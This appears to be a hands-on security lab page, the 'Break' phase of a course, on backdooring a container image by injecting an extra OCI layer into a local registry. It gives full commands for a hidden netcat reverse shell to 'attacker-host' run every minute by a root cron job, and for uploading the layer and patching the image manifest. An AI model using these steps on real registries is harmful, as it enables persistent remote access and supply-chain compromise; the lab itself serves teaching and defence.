# Lab 3.5: Layer Injection

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Inject a Malicious Layer

### Step 1: Create the malicious layer

```bash
mkdir -p /tmp/inject/usr/local/bin
cat > /tmp/inject/usr/local/bin/.hidden-shell << 'PAYLOAD'
#!/bin/sh
# Simulated reverse shell
while true; do
  sh -i 2>&1 | nc attacker-host 4444 > /dev/null 2>&1
  sleep 60
done
PAYLOAD
chmod +x /tmp/inject/usr/local/bin/.hidden-shell

mkdir -p /tmp/inject/etc/cron.d
echo "* * * * * root /usr/local/bin/.hidden-shell" > /tmp/inject/etc/cron.d/update
```

### Step 2: Package it as an OCI layer

```bash
cd /tmp/inject
tar czf /tmp/malicious-layer.tar.gz .
LAYER_DIGEST=$(sha256sum /tmp/malicious-layer.tar.gz | awk '{print "sha256:"$1}')
LAYER_SIZE=$(stat -c %s /tmp/malicious-layer.tar.gz 2>/dev/null || stat -f %z /tmp/malicious-layer.tar.gz)
echo "Layer digest: $LAYER_DIGEST"
echo "Layer size: $LAYER_SIZE"
```

### Step 3: Push the blob to the registry

```bash
crane blob upload registry:5000/webapp /tmp/malicious-layer.tar.gz
```

### Step 4: Patch the manifest

The blob must be uploaded to the registry before you can reference its digest in a manifest. If you patch the manifest first, the registry will reject it because the referenced layer does not exist yet.

```bash
crane manifest registry:5000/webapp:latest > /tmp/original-manifest.json

cat /tmp/original-manifest.json | jq --arg digest "$LAYER_DIGEST" --argjson size "$LAYER_SIZE" \
  '.layers += [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": $digest, "size": $size}]' \
  > /tmp/injected-manifest.json

echo "Original layers: $(jq '.layers | length' /tmp/original-manifest.json)"
echo "Injected layers: $(jq '.layers | length' /tmp/injected-manifest.json)"
```

### Step 5: Push the modified manifest

```bash
crane manifest push /tmp/injected-manifest.json registry:5000/webapp:latest
```

The tag now points to the injected image.

### Step 6: Confirm the injection

```bash
docker pull registry:5000/webapp:latest
docker run --rm --entrypoint cat registry:5000/webapp:latest /usr/local/bin/.hidden-shell
```

The reverse shell is in the image. The original application still runs. The injected layer only adds files, so nothing breaks.

### Step 7: Compare against baseline

```bash
NEW_COUNT=$(crane manifest registry:5000/webapp:latest | jq '.layers | length')
NEW_DIGEST=$(crane digest registry:5000/webapp:latest)
echo "Before: $LAYER_COUNT layers, digest $MANIFEST_DIGEST"
echo "After:  $NEW_COUNT layers, digest $NEW_DIGEST"
```

Layer count increased by one, manifest digest changed. If nobody recorded the originals, nobody notices.
